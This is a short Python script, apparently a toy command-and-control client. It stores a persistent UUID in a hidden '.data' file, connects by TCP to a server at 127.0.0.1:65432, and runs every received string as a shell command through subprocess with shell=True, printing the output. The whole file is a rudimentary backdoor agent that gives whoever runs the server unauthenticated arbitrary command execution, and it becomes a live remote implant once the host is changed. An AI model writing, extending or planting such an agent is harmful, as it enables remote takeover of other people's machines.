from pathlib import Path
import subprocess
import socket
import uuid

def exe_cmd(cmd) -> str:
    out = subprocess.run(cmd, capture_output=True, text=True, shell=True)
    if not out.returncode == 0:
        return f"ERROR: {out.stderr}"
    else:
        return out.stdout


# --- storing UUID ---

uuid_file = Path("./.data")
if uuid_file.is_file():
    with open(".data", 'r') as f:
        print(f"your UUID: {f.read()}")

else:
    with open(".data", 'w') as f:
        my_uuid = str(uuid.uuid4())
        f.write(my_uuid)
        print(f"your UUID: {my_uuid}")


# --- Socket  Connection ---

HOST = "127.0.0.1" 
PORT = 65432

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    print("Waiting for the connection ...")
    s.connect((HOST, PORT))
    print("Connected")

    while True:
        data = s.recv(1024)
        print(data.decode())
        print(exe_cmd(data.decode()))


